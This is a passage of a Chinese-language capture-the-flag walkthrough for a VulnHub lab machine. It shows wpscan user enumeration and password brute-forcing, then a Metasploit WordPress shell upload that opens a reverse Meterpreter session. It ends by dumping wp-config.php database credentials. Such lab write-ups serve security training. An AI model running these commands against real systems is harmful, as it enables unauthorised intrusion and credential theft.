class="built_in">type</span>, consider --fork=4</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Almost <span class="keyword">done</span>: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">goodluck         (?)</span><br><span class="line">1g 0:00:00:00 DONE 2/3 (2020-01-12 20:31) 20.00g/s 3680p/s 3680c/s 3680C/s emily..iceman</span><br><span class="line">Use the <span class="string">&quot;--show --format=Raw-SHA1&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<p>john破解hash的结果是：goodluck<br>在这一点上，我们只是被拖钓了。然后，我们尝试上传一个简单的.php文件，而在上传.php文件时，我们遇到以下错误：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub152.jpg"></p>
<p>但是这个错误导致我们进入了新页面“upload.php”。让我们检查此页面的源代码</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub153.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!--ZmxvY2NpbmF1Y2luaWhpbGlwaWxpZmljYXRpb24K--&gt;</span><br></pre></td></tr></table></figure>

<p>源代码末尾有一个注释。这是base64编码的文本，因此，使用以下命令对其进行解码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># echo ZmxvY2NpbmF1Y2luaWhpbGlwaWxpZmljYXRpb24K | base64 -d</span></span><br><span class="line">floccinaucinihilipilification</span><br></pre></td></tr></table></figure>

<p>不知道为什么这里解密字符串和结果和别人的walkthrough不一样，别人的是c28tZGV2LXdvcmRwcmVzcw==，解密出来是so-dev-wordpress</p>
<p>文本解码后，看起来像目录或网页。但是在探索之前，先看看是否有更多的页面。因此，使用dirbuster。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.108/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Jan 12 20:42:40 2020</span><br><span class="line">URL_BASE: http://192.168.56.108/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.108/ ----</span><br><span class="line">+ http://192.168.56.108/index.html (CODE:200|SIZE:10918)                                              </span><br><span class="line">+ http://192.168.56.108/info.php (CODE:200|SIZE:84111)                                                </span><br><span class="line">+ http://192.168.56.108/server-status (CODE:403|SIZE:279)                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/                                                       </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/index.php (CODE:301|SIZE:0)                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/                                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-content/                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-includes/                                           </span><br><span class="line">+ http://192.168.56.108/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                       </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-admin/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/css/                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/images/                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/includes/                                     </span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/js/                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/maint/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/network/                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-admin/user/                                         </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-content/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-content/index.php (CODE:200|SIZE:0)                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-content/plugins/                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.108/wordpress/wp-content/themes/                                     </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                        </span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                        </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                           </span><br><span class="line">+ http://192.168.56.108/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                           </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                      </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.108/wordpress/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.56.108/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0) </span><br></pre></td></tr></table></figure>

<p>有很多页面，结果显示CMS是wordpress，因此，可以使用wpscan浏览提到wordpress的两个指定页面。为此，请使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.108/wordpress/ --enumerate</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.6</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] It seems like you have not updated the database for some time.</span></span><br><span class="line"><span class="string">[?] Do you want to update now? [Y]es [N]o, default: [N][+] URL: http://192.168.56.108/wordpress/</span></span><br><span class="line"><span class="string">[+] Started: Sun Jan 12 20:45:08 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.108/wordpress/</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.108/wordpress/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.108/wordpress/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.108/wordpress/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.3 identified (Insecure, released on 2019-11-12).</span></span><br><span class="line"><span class="string"> | Found By: Emoji Settings (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.108/wordpress/, Match: &#x27;</span>wp-includes\/js\/wp-emoji-release.min.js?ver=5.3<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> | Confirmed By: Meta Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.108/wordpress/, Match: &#x27;</span>WordPress 5.3<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] The main theme could not be detected.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No plugins Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:00 &lt;=======================&gt; (320 / 320) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No themes Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:01 &lt;=====================&gt; (2568 / 2568) 100.00% Time: 00:00:01</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Timthumbs Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Config Backups - Time: 00:00:00 &lt;==========================&gt; (21 / 21) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Config Backups Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating DB Exports (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking DB Exports - Time: 00:00:00 &lt;==============================&gt; (36 / 36) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No DB Exports Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)</span></span><br><span class="line"><span class="string"> Brute Forcing Attachment IDs - Time: 00:00:00 &lt;===================&gt; (100 / 100) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Medias Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=========================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] bossperson</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Sun Jan 12 20:45:16 2020</span></span><br><span class="line"><span class="string">[+] Requests Done: 3094</span></span><br><span class="line"><span class="string">[+] Cached Requests: 4</span></span><br><span class="line"><span class="string">[+] Data Sent: 840.6 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 567.645 KB</span></span><br><span class="line"><span class="string">[+] Memory used: 183.743 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:07</span></span><br></pre></td></tr></table></figure>

<p>得到user为bossperson,同样，让枚举另一页。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.108/so-dev-wordpress/ -U bossperson -P /usr/share/wordlists/dirb/common.txt</span></span><br><span class="line">[+] Performing password attack on Wp Login against 1 user/s</span><br><span class="line">Trying bossperson / zoom Time: 00:00:27 &lt;========================&gt; (4614 / 4614) 100.00% Time: 00:00:27</span><br><span class="line"></span><br><span class="line">[i] No Valid Passwords Found.</span><br></pre></td></tr></table></figure>

<p>找不到任何密码，但是不用担心，因为可以在另一页上运行相同的命令，请输入以下内容进行尝试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.108/so-dev-wordpress/ --enumerate</span></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] mike</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
<p>找到用户名之后，运行下面的命令爆破密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.56.108/so-dev-wordpress/ -U admin,mike -P /usr/share/wordlists/dirb/common.txt</span></span><br><span class="line">[+] Performing password attack on Wp Login against 2 user/s</span><br><span class="line">[SUCCESS] - admin / admin1                                                                             </span><br><span class="line">Trying mike / zope Time: 00:00:36 &lt;==============================&gt; (4914 / 4914) 100.00% Time: 00:00:36</span><br><span class="line"></span><br><span class="line">[i] Valid Combinations Found:</span><br><span class="line"> | Username: admin, Password: admin1</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>得到admin/admin1,终于找到了用户admin的密码。现在，使用msfconsole上传shell。通过Metasploit，使用exploit/unix/webapp/wp_admin_shell_upload。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">  Metasploit Park, System Security Interface                                                           </span><br><span class="line">  Version 4.0.5, Alpha E                                                                               </span><br><span class="line">  Ready...                                                                                             </span><br><span class="line">  &gt; access security                                                                                    </span><br><span class="line">  access: PERMISSION DENIED.</span><br><span class="line">  &gt; access security grid</span><br><span class="line">  access: PERMISSION DENIED.</span><br><span class="line">  &gt; access main security grid</span><br><span class="line">  access: PERMISSION DENIED....and...</span><br><span class="line">  YOU DIDN<span class="string">&#x27;T SAY THE MAGIC WORD!</span></span><br><span class="line"><span class="string">  YOU DIDN&#x27;</span>T SAY THE MAGIC WORD!                                                                       </span><br><span class="line">  YOU DIDN<span class="string">&#x27;T SAY THE MAGIC WORD!                                                                       </span></span><br><span class="line"><span class="string">  YOU DIDN&#x27;</span>T SAY THE MAGIC WORD!                                                                       </span><br><span class="line">  YOU DIDN<span class="string">&#x27;T SAY THE MAGIC WORD!                                                                       </span></span><br><span class="line"><span class="string">  YOU DIDN&#x27;</span>T SAY THE MAGIC WORD!                                                                       </span><br><span class="line">  YOU DIDN<span class="string">&#x27;T SAY THE MAGIC WORD!                                                                       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v5.0.68-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 1957 exploits - 1093 auxiliary - 336 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span></span><br><span class="line"><span class="string">+ -- --=[ 7 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 &gt; use exploit/unix/webapp/wp_admin_shell_upload</span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set Pa</span></span><br><span class="line"><span class="string">set PaSSWORD  set PaYLOAD   </span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set PA</span></span><br><span class="line"><span class="string">set PASSWORD  set PAYLOAD   </span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set PASSWORD admin1</span></span><br><span class="line"><span class="string">PASSWORD =&gt; admin1</span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set USERNAME admin</span></span><br><span class="line"><span class="string">USERNAME =&gt; admin</span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set rhost 192.168.56.108</span></span><br><span class="line"><span class="string">rhost =&gt; 192.168.56.108</span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set TARGET</span></span><br><span class="line"><span class="string">set TARGET     set TARGETURI  </span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set TARGETURI /so-dev-wordpress</span></span><br><span class="line"><span class="string">TARGETURI =&gt; /so-dev-wordpress</span></span><br><span class="line"><span class="string">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Started reverse TCP handler on 192.168.56.102:4444 </span></span><br><span class="line"><span class="string">[*] Authenticating with WordPress using admin:admin1...</span></span><br><span class="line"><span class="string">[+] Authenticated with WordPress</span></span><br><span class="line"><span class="string">[*] Preparing payload...</span></span><br><span class="line"><span class="string">[*] Uploading payload...</span></span><br><span class="line"><span class="string">[*] Executing the payload at /so-dev-wordpress/wp-content/plugins/RnhGIdzuxq/oElblRDrKY.php...</span></span><br><span class="line"><span class="string">[*] Sending stage (38288 bytes) to 192.168.56.108</span></span><br><span class="line"><span class="string">[*] Meterpreter session 1 opened (192.168.56.102:4444 -&gt; 192.168.56.108:60668) at 2020-01-12 22:03:59 -0500</span></span><br><span class="line"><span class="string">[+] Deleted oElblRDrKY.php</span></span><br><span class="line"><span class="string">[+] Deleted RnhGIdzuxq.php</span></span><br><span class="line"><span class="string">[+] Deleted ../RnhGIdzuxq</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt; id</span></span><br><span class="line"><span class="string">[-] Unknown command: id.</span></span><br><span class="line"><span class="string">meterpreter &gt; sysinfo</span></span><br><span class="line"><span class="string">Computer    : inplainsight</span></span><br><span class="line"><span class="string">OS          : Linux inplainsight 5.3.0-23-generic #25-Ubuntu SMP Tue Nov 12 09:22:33 UTC 2019 x86_64</span></span><br><span class="line"><span class="string">Meterpreter : php/linux</span></span><br></pre></td></tr></table></figure>

<p>成功使用msf拿到了shell，获得标准输出的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1396 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">sh: 0: getcwd() failed: No such file or directory</span><br><span class="line">sh: 0: getcwd() failed: No such file or directory</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">sh: 0: getcwd() failed: No such file or directory</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p>探索</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">akismet  hello.php  index.php</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/var/www/html/so-dev-wordpress/wp-content/plugins</span><br><span class="line">$ </span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> ../..</span><br><span class="line"><span class="built_in">cd</span> ../..</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">index.php        wp-blog-header.php    wp-cron.php        wp-mail.php</span><br><span class="line">license.txt      wp-comments-post.php  wp-includes        wp-settings.php</span><br><span class="line">readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php</span><br><span class="line">wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php</span><br><span class="line">wp-admin         wp-content            wp-login.php       xmlrpc.php</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/var/www/html/so-dev-wordpress</span><br><span class="line">$ cat wp-config.php</span><br><span class="line">cat wp-config.php</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration <span class="keyword">for</span> WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * This file contains the following configurations:</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * * MySQL settings</span></span><br><span class="line"><span class="string"> * * Secret keys</span></span><br><span class="line"><span class="string"> * * Database table prefix</span></span><br><span class="line"><span class="string"> * * ABSPATH</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>sodevwp<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>sodevwp<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database password */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>oZ2R3c2x7dLL6<span class="comment">#hJ&#x27; );</span></span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** Database Charset to use <span class="keyword">in</span> creating database tables. */</span><br><span class="line">define( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** The Database Collate <span class="built_in">type</span>. Don<span class="string">&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_COLLATE<span class="string">&#x27;, &#x27;</span><span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/**#@+</span></span><br><span class="line"><span class="string"> * Authentication Unique Keys and Salts.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * Change these to different unique phrases!</span></span><br><span class="line"><span class="string"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span></span><br><span class="line"><span class="string"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @since 2.6.0</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">define( &#x27;</span>AUTH_KEY<span class="string">&#x27;,         &#x27;</span>b_P&gt;20/J+HW!D1-[XI1~~abSjE~8do)Rp]jt/~Q0s-6/!U,Norv&#123;.+1xOh5+gnPr<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">define( &#x27;</span>SECURE_AUTH_KEY<span class="string">&#x27;,  &#x27;</span>nbfna5q3cP5/Gfaa`H`4&#123;SklZTx+inPmf*uh!boz=K`bUSldsl?m`-&#123;0FZ9Kdw4$<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">define( &#x27;</span>LOGGED_IN_KEY<span class="string">&#x27;,    &#x27;</span>UC8f4&#123;^Z[9co/&gt;[n*opw @Dtss(?~[dBQ/Xtbm8&amp;/rx1&#123;=Y^obQY`DE7ZYmHwSQT<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">define( &#x27;</span>NONCE_KEY<span class="string">&#x27;,        &#x27;</span>Z)O2rZ_IT6fNshPKa^RB:2?EU%a|tV91z,mWU<span class="variable">$rfsoFnbUVKp4l</span>;+z lrN4~T(9h<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">define( &#x27;</span>AUTH_SALT<span class="string">&#x27;,        &#x27;</span>]C-xQeq^*m$<span class="variable">$yt</span>:oLqg&gt;b?+teMLO7~&lt;<span class="comment">#|j@(n/K~L!4 n&#123;UCp%|$;;[_@6u]PHxT&#x27; );</span></span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;(rtGT9%Jv uX95E&amp;!tdiTZ7X19u:ak_B_L@YOeRq6eLf.bWV&#123;7|0Kn2JjOmk~[~l&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;1cC3onJs2/0; 5R91DS]m&gt;i|-P1&lt;SaQqUN3Lg`u|4&#123;]aH826Fnt*,[RY?&#123;y0JGeG&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;6a?qf^w0Q1D&#123;%!Y_HIO&amp;#Kc-p19/p8~#*Zo~6NHyZqSgL7ws6=Vdg|*Hijk&lt;7T4&#123;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;sodevwp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used <span class="keyword">for</span> debugging,</span><br><span class="line"> * visit the Codex.</span><br><span class="line"> *</span><br><span class="line"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"> */</span><br><span class="line">define( <span 